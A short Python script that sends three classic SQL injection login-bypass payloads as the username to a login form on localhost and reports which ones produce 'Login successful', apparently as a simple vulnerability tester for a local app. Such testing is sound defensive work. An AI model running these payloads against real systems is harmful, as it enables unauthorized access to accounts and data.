import requests

url = "http://127.0.0.1:5000/"
payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
]

for payload in payloads:
    data = {'username': payload, 'password': 'anything'}
    r = requests.post(url, data=data)
    if "Login successful" in r.text:
        print(f"[!] Possible SQL Injection vulnerability detected with payload: {payload}")
    else:
        print(f"[-] Payload did not succeed: {payload}") 